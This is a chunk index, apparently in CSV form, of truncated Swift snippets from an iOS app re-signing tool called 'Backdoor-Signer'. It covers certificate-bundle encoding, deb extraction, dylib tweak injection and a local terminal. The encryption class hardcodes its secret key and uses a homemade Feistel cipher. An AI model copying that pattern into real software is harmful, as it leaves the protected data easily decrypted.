let lengthBytes = withUnsafeBytes(of: length) { Data($0) }"
180,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Encodes a BackdoorFile into raw data with encryption (new format) / - Parameter backdoorFile: The structured BackdoorFile to encode / - Returns: Raw data representing the encrypted .backdoor file format","static func encodeEncryptedBackdoor(backdoorFile: BackdoorFile) -> Data {
var data = Data()

// Add format version byte
data.append(ENCRYPTED_FORMAT_VERSION)

// Helper to write a length-prefixed chunk
func writeChunk(_ chunkData: Data, to data: inout Data) {"
181,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Helper to write a length-prefixed chunk","func writeChunk(_ chunkData: Data, to data: inout Data) {
let length = UInt32(chunkData.count).bigEndian
let lengthBytes = withUnsafeBytes(of: length) { Data($0) }"
182,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Helper to write an encrypted chunk","func writeEncryptedChunk(_ chunkData: Data, to data: inout Data) {
// Store original length
let originalLength = UInt32(chunkData.count).bigEndian
let originalLengthBytes = withUnsafeBytes(of: originalLength) { Data($0) }"
183,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Checks if a file URL points to a .backdoor file / - Parameter url: The file URL to check / - Returns: True if the file is likely a backdoor file","static func isBackdoorFile(at url: URL) -> Bool {
// First check extension
if url.pathExtension.lowercased() == ""backdoor"" {"
184,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper method to check if data is in the backdoor file format / - Parameter data: The data to check / - Returns: True if the data appears to be in backdoor format","static func isBackdoorFormat(data: Data) -> Bool {
// Check for encrypted format
if data.count > 1 && data[0] == ENCRYPTED_FORMAT_VERSION {"
185,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper to read a length-prefixed chunk (used by multiple methods)","static func readChunk(from data: Data, offset: inout Int) throws -> Data {
guard offset + 4 <= data.count else {"
186,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Errors that can occur during decoding or verification of backdoor files","enum DecodingError: Error {
case invalidFormat(String)
case invalidCertificate(String)
case unsupportedAlgorithm(String)
case signatureVerificationFailed(String)
case decryptionFailed(String)
}

// Add utility extensions for BackdoorFile
extension BackdoorFile {"
187,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Add utility extensions for BackdoorFile","extension BackdoorFile {
/// Extract and return certificate name for display
var certificateName: String {"
188,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper to save the mobileprovision file","func saveMobileProvision(to url: URL) throws {
try mobileProvisionData.write(to: url)
}

/// Helper to save the p12 file
func saveP12(to url: URL) throws {"
189,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper to save the p12 file","func saveP12(to url: URL) throws {
try p12Data.write(to: url)
}

/// Save this backdoor file to disk with .backdoor extension
/// - Parameters:
///   - url: Base URL (without extension)
///   - encrypt: Whether to use the encrypted format (default: true)
/// - Returns: URL to the saved file
@discardableResult"
190,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Function saveBackdoorFile - implements savebackdoorfile functionality","func saveBackdoorFile(to baseURL: URL, encrypt: Bool = true) throws -> URL {
// Ensure the URL has the .backdoor extension
let fileURL: URL
if baseURL.pathExtension.lowercased() != ""backdoor"" {"
191,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","struct ARFile - implements functionality related to a r file","public struct ARFile {
var name: String
var modificationDate: Date
var ownerId: Int
var groupId: Int
var mode: Int
var size: Int
var content: Data
}
"
192,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","Function removePadding - implements removepadding functionality","func removePadding(_ paddedString: String) -> String {
let data = paddedString.data(using: .utf8)!

guard let firstNonSpaceIndex = data.firstIndex(of: UInt8(ascii: "" "")) else {"
193,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","enum ARError - implements functionality related to a r error","enum ARError: Error {
case badArchive(String)
}

func getFileInfo(_ data: Data, _ offset: Int) throws -> ARFile {"
194,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","Function getFileInfo - retrieves fileinfo","func getFileInfo(_ data: Data, _ offset: Int) throws -> ARFile {
let sizeRange = offset + 48 ..< offset + 48 + 10
let sizeString = String(data: data.subdata(in: sizeRange), encoding: .ascii) ?? ""0""
let size = Int(removePadding(sizeString))!
if size < 1 {"
195,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","Function extractAR - implements extractar functionality","public func extractAR(_ rawData: Data) throws -> [ARFile] {
// Explicitly type magicBytes as [UInt8] to match the headerBytes type
let magicBytes: [UInt8] = [0x21, 0x3C, 0x61, 0x72, 0x63, 0x68, 0x3E, 0x0A]
let headerData = rawData.subdata(in: 0 ..< 8)
// Create a more explicit [UInt8] array conversion for unambiguous type checking
let headerBytes = [UInt8](headerData)
if headerBytes != magicBytes {"
196,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function processFile - implements processfile functionality","func processFile(at packagesFile: inout URL) throws {
let succeededExtension = packagesFile.pathExtension.lowercased()
let fileManager = FileManager.default

func readData(from url: URL) throws -> Data {"
197,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function readData - implements readdata functionality","func readData(from url: URL) throws -> Data {
return try Data(contentsOf: url)
}

func writeData(_ data: Data, to url: URL) throws {"
198,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function writeData - implements writedata functionality","func writeData(_ data: Data, to url: URL) throws {
try data.write(to: url)
}

func handleCompressedFile(extension _: String, decompressor: (Data) throws -> Data) throws {"
199,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","extension _ - implements _ functionality","func handleCompressedFile(extension _: String, decompressor: (Data) throws -> Data) throws {
let compressedData = try readData(from: packagesFile)
let decompressedData = try decompressor(compressedData)
let outputURL = packagesFile.deletingPathExtension()
try writeData(decompressedData, to: outputURL)
packagesFile = outputURL
}

func handleTarFile() throws {"
200,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function handleTarFile - implements handletarfile functionality","func handleTarFile() throws {
let tarData = try readData(from: packagesFile)
let tarContainer = try TarContainer.open(container: tarData)

let extractionDirectory = packagesFile.deletingLastPathComponent().appendingPathComponent(UUID().uuidString)
try fileManager.createDirectory(at: extractionDirectory, withIntermediateDirectories: true, attributes: nil)

for entry in tarContainer {"
201,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Provides custom encryption and decryption capabilities for .backdoor files / This implementation matches the Python reference implementation for compatibility","class BackdoorEncryption {
// Hardcoded secret key for encryption and decryption
private static let SECRET = ""bdg_was_here_2025_backdoor_245"".data(using: .utf8)!

// Derive key using SHA256
private static var KEY: Data {"
202,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Pads data to align with block size / - Parameters: /   - data: The data to pad /   - blockSize: Block size (default: 16 bytes) / - Returns: Padded data","static func pad(_ data: Data, blockSize: Int = 16) -> Data {
if data.count % blockSize == 0 {"
203,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Custom permutation for obfuscation (byte reversal) / - Parameter block: Block to permute / - Returns: Permuted block","static func permute(_ block: Data) -> Data {
return Data(block.reversed())
}

/// Transformation function for Feistel network
/// - Parameters:
///   - data: Input data
///   - roundKey: Round key
/// - Returns: Transformed data
static func F(_ data: Data, roundKey: Data) -> Data {"
204,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Transformation function for Feistel network / - Parameters: /   - data: Input data /   - roundKey: Round key / - Returns: Transformed data","static func F(_ data: Data, roundKey: Data) -> Data {
var combined = data
combined.append(roundKey)

let hash = SHA256.hash(data: combined)
return hash.withUnsafeBytes { bytes in"
205,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Encrypts a single 16-byte block using a Feistel network / - Parameters: /   - block: 16-byte block to encrypt /   - key: Encryption key / - Returns: Encrypted block","static func encryptBlock(_ block: Data, key: Data) -> Data {
var L = block.prefix(8)
var R = block.suffix(8)

for round in 0 ..< 4 {"
206,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Decrypts a single 16-byte block using a Feistel network / - Parameters: /   - block: 16-byte block to decrypt /   - key: Decryption key / - Returns: Decrypted block","static func decryptBlock(_ block: Data, key: Data) -> Data {
var R = block.prefix(8)
var L = block.suffix(8)

for round in (0 ..< 4).reversed() {"
207,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Encrypts data using custom block cipher / - Parameters: /   - data: Data to encrypt /   - key: Optional custom key (uses default if nil) / - Returns: Encrypted data","static func encryptData(_ data: Data, key: Data? = nil) -> Data {
let encryptionKey = key ?? KEY
let paddedData = pad(data)

// Split into 16-byte blocks
var encryptedData = Data()

for i in stride(from: 0, to: paddedData.count, by: 16) {"
208,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Decrypts data using custom block cipher / - Parameters: /   - encryptedData: Data to decrypt /   - key: Optional custom key (uses default if nil) /   - originalLength: Length of the original data before padding / - Returns: Decrypted data","static func decryptData(_ encryptedData: Data, key: Data? = nil, originalLength: Int) -> Data {
let decryptionKey = key ?? KEY
var decryptedData = Data()

// Process each 16-byte block
for i in stride(from: 0, to: encryptedData.count, by: 16) {"
209,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function zsign - implements zsign functionality","func zsign(_ appPath: String,
_ provisionPath: String,
_ p12Path: String,
_ password: String,
_ bundleId: String,
_ name: String,
_ version: String,
_ removeProvisioningFile: Bool) -> Int32

// MARK: - External C++ functions

@_silgen_name(""InjectDyLib"")
private func _InjectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool

@_silgen_name(""ChangeDylibPath"")
private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool

@_silgen_name(""ListDylibs"")
private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
210,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _InjectDyLib - implements  injectdylib functionality","private func _InjectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool

@_silgen_name(""ChangeDylibPath"")
private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool

@_silgen_name(""ListDylibs"")
private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
211,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _ChangeDylibPath - implements  changedylibpath functionality","private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool

@_silgen_name(""ListDylibs"")
private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
212,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _ListDylibs - implements  listdylibs functionality","private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
213,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _UninstallDylibs - implements  uninstalldylibs functionality","private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
214,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","MARK: - Swift wrapper functions","func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {
return _InjectDyLib(filePath, dylibPath, weakInject, bCreate)
}

func changeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool {"
215,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function changeDylibPath - implements changedylibpath functionality","func changeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool {
return _ChangeDylibPath(filePath, oldPath, newPath)
}

func getDylibsList(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool {"
216,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function getDylibsList - retrieves dylibslist","func getDylibsList(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool {
return _ListDylibs(filePath, dylibPaths)
}

func removeDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool {"
217,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function removeDylibs - implements removedylibs functionality","func removeDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool {
return _UninstallDylibs(filePath, dylibPaths)
}

// MARK: - App Signing Functions

func signInitialApp(
bundle: BundleOptions,
mainOptions: SigningMainDataWrapper,
signingOptions: SigningDataWrapper,"
218,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","MARK: - App Signing Functions","func signInitialApp(
bundle: BundleOptions,
mainOptions: SigningMainDataWrapper,
signingOptions: SigningDataWrapper,
appPath: URL,
completion: @escaping (Result<(URL, NSManagedObject), Error>) -> Void
) {"
219,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function resignApp - implements resignapp functionality","func resignApp(certificate: Certificate, appPath: URL, completion: @escaping (Bool) -> Void) {
UIApplication.shared.isIdleTimerDisabled = true

DispatchQueue(label: ""Resigning"").async {"
220,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","MARK: - Helper Functions","private func signAppWithZSign(
tmpDirApp: URL,
certPaths: (provisionPath: String, p12Path: String),
password: String,
main: SigningMainDataWrapper? = nil,
options: SigningDataWrapper? = nil
) throws {"
221,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function injectDylib - implements injectdylib functionality","func injectDylib(filePath: String, dylibPath: String, weakInject: Bool) -> Bool {
// Call injectDyLib function using the Swift wrapper
let bCreate = false
return injectDyLib(filePath, dylibPath, weakInject, bCreate)
}

func changeDylib(filePath: String, oldPath: String, newPath: String) -> Bool {"
222,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function changeDylib - implements changedylib functionality","func changeDylib(filePath: String, oldPath: String, newPath: String) -> Bool {
// Call changeDylibPath function using the Swift wrapper
return changeDylibPath(filePath, oldPath, newPath)
}

func updateMobileProvision(app: URL) throws {"
223,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updateMobileProvision - updates mobileprovision","func updateMobileProvision(app: URL) throws {
let provisioningFilePath = app.appendingPathComponent(""embedded.mobileprovision"")
if FileManager.default.fileExists(atPath: provisioningFilePath.path) {"
224,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function listDylibs - implements listdylibs functionality","func listDylibs(filePath: String) -> [String]? {
// Call listDylibs function using the Swift wrapper
let dylibPathsArray = NSMutableArray()

let success = getDylibsList(filePath, dylibPathsArray)

if success {"
225,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function uninstallDylibs - implements uninstalldylibs functionality","func uninstallDylibs(filePath: String, dylibPaths: [String]) -> Bool {
// Call removeDylibs function using the Swift wrapper
return removeDylibs(filePath, dylibPaths)
}

func updatePlugIns(options: SigningDataWrapper, app: URL) throws {"
226,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updatePlugIns - updates plugins","func updatePlugIns(options: SigningDataWrapper, app: URL) throws {
if options.signingOptions.removePlugins {"
227,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function removeWatchPlaceholderExtension - implements removewatchplaceholderextension functionality","func removeWatchPlaceholderExtension(options: SigningDataWrapper, app: URL) throws {
if options.signingOptions.removeWatchPlaceHolder {"
228,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updateInfoPlist - updates infoplist","func updateInfoPlist(
infoDict: NSMutableDictionary,
main: SigningMainDataWrapper,
options: SigningDataWrapper,
icon _: UIImage?,
app: URL
) throws {"
229,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updateLocalizedInfoPlist - updates localizedinfoplist","func updateLocalizedInfoPlist(in appDirectory: URL, newDisplayName: String) {
let fileManager = FileManager.default
do {"
230,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","class TweakHandler - implements functionality related to tweak handler","class TweakHandler {
let fileManager = FileManager.default

private var urls: [String]
private let app: URL
private var urlsToInject: [URL] = []
private var directoriesToCheck: [URL] = []

init(urls: [String], app: URL) {"
231,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function getInputFiles - retrieves inputfiles","func getInputFiles() throws {
guard !urls.isEmpty else {"
232,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","finally, handle extracted contents","private func handleExtractedDirectoryContents(at urls: [URL]) throws {
for url in urls {"
233,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Inject imported dylib file","private func handleDylib(at url: URL) throws {
do {"
234,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Inject imported framework dir","private func handleDylib(framework: URL) throws {
do {"
235,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Extract imported deb file","private func handleDeb(at url: URL, baseTmpDir: URL) throws {
let uniqueSubDir = baseTmpDir.appendingPathComponent(UUID().uuidString)
try Self.createDirectoryIfNeeded(at: uniqueSubDir)

// I don't particularly like this code
// but it somehow works well enough,
// do note large lzma's are slow as hell
do {"
236,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Read extracted deb file, locate all necessary contents to copy over to the .app","private func handleDirectories(at urls: [URL]) throws {
let directoriesToCheck = [
""Library/Frameworks/"",
""var/jb/Library/Frameworks/"",
""Library/MobileSubstrate/DynamicLibraries/"",
""var/jb/Library/MobileSubstrate/DynamicLibraries/"",
""Library/Application Support/"",
""var/jb/Library/Application Support/"",
]
"
237,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","MARK: - Find correct files in debs","extension TweakHandler {
private func searchForBundles(in directory: URL) throws {"
238,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function searchForBundles - implements searchforbundles functionality","private func searchForBundles(in directory: URL) throws {
let fileManager = FileManager.default
let allFiles = try fileManager.contentsOfDirectory(
at: directory,
includingPropertiesForKeys: nil,
options: [.skipsHiddenFiles]
)

let bundleDirectories = allFiles.filter { url in"
239,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function locateDylibFiles - implements locatedylibfiles functionality","private func locateDylibFiles(in directory: URL) throws -> [URL] {
let fileManager = FileManager.default
let files = try fileManager.contentsOfDirectory(at: directory, includingPropertiesForKeys: nil, options: [])

return files.filter { url in"
240,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function locateFrameworkDirectories - implements locateframeworkdirectories functionality","private func locateFrameworkDirectories(in directory: URL) throws -> [URL] {
let fileManager = FileManager.default
let files = try fileManager.contentsOfDirectory(
at: directory,
includingPropertiesForKeys: nil,
options: [.skipsHiddenFiles]
)

return files.filter { url in"
241,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","MARK: - File management","extension TweakHandler {
private static func createDirectoryIfNeeded(at url: URL) throws {"
242,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function createDirectoryIfNeeded - creates directoryifneeded","private static func createDirectoryIfNeeded(at url: URL) throws {
let fileManager = FileManager.default
if !fileManager.fileExists(atPath: url.path) {"
243,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function findExecutable - implements findexecutable functionality","public static func findExecutable(at frameworkURL: URL) throws -> URL? {
let infoPlistURL = frameworkURL.appendingPathComponent(""Info.plist"")

let plistData = try Data(contentsOf: infoPlistURL)
if let plist = try PropertyListSerialization
.propertyList(from: plistData, options: [], format: nil) as? [String: Any],
let executableName = plist[""CFBundleExecutable""] as? String
{"
244,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function moveFile - implements movefile functionality","private static func moveFile(from sourceURL: URL, to destinationURL: URL) throws {
let fileManager = FileManager.default
if fileManager.fileExists(atPath: destinationURL.path) {"
245,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift","class EsignDecryptor - implements functionality related to esign decryptor","class EsignDecryptor {
private let input: String

init(input: String) {"
246,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift","Function extractBase64 - implements extractbase64 functionality","func extractBase64() -> Data? {
let pattern = #""source\[(.*?)\]""#

if let regex = try? NSRegularExpression(pattern: pattern),
let match = regex.firstMatch(in: input, range: NSRange(input.startIndex..., in: input)),
let range = Range(match.range(at: 1), in: input)
{"
247,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift","Function decrypt - implements decrypt functionality","func decrypt(key: [UInt8], keyLength: Int) -> [String]? {
guard let data = extractBase64() else {"
248,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ LocalTerminalService - An on-device implementation of terminal functionality / This replaces the previous web-based terminal implementation with a fully local solution","class LocalTerminalService {
static let shared = LocalTerminalService()

// Process handling
private var activeProcesses: [String: Process] = [:]
private var outputPipes: [String: Pipe] = [:]
private var inputPipes: [String: Pipe] = [:]

// Output handlers
private var outputHandlers: [String: (String) -> Void] = [:]"
249,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Session Management / Creates a new terminal session","func createSession(completion: @escaping (Result<String, Error>) -> Void) {
let sessionId = UUID().uuidString

// Set default working directory to Documents
let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
workingDirectories[sessionId] = documentsDirectory

logger.log(message: ""Created new local terminal session: \(sessionId)"", type: .info)
completion(.success(sessionId))
}"
250,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Terminates a terminal session","func terminateSession(_ sessionId: String, completion: @escaping (Result<Void, Error>) -> Void) {
if let process = activeProcesses[sessionId] {"
251,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Command Execution / Executes a command in the specified session","func executeCommand(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
252,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Sends input to a running process","func sendInput(_ input: String, sessionId: String, completion: @escaping (Result<Void, Error>) -> Void) {
guard let inputPipe = inputPipes[sessionId] else {"
253,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Handles special built-in commands","private func handleSpecialCommand(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) -> Bool {"
254,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Updates the working directory after a 'cd' command","private func updateWorkingDirectory(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void
) {"
255,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Custom Language Support / Executes a command in our custom programming language","private func executeCustomLanguageCommand(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
256,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Executes Swift code","private func executeSwiftCode(
_ code: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
257,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Executes Python code","private func executePythonCode(
_ code: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
258,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Executes mixed code that contains both Python and Swift","private func executeMixedCode(
_ code: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
259,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Terminal Help / Shows help information","private func showHelp(outputHandler: @escaping (String) -> Void) {
let helpText = """"""
Backdoor Terminal Help
======================

Basic Commands:
clear, cls     Clear the terminal screen
pwd            Print working directory
cd <path>      Change directory
ls             List files in current directory"
260,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Shows help information about the custom programming language","private func showLanguageHelp(outputHandler: @escaping (String) -> Void) {
let helpText = """"""
Backdoor Custom Programming Language
===================================

The custom language supports both Swift and Python execution with
seamless interoperability between them.

Single Language Execution:
--------------------------"
261,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Custom Language Structures / Custom language parser for the Backdoor programming language","class CustomLanguageParser {
enum LanguageMode {"
262,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","enum LanguageMode - implements functionality related to language mode","enum LanguageMode {
case swift
case python
case mixed
}

struct ParsedCommand {"
263,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","struct ParsedCommand - implements functionality related to parsed command","struct ParsedCommand {
let mode: LanguageMode
let code: String
}

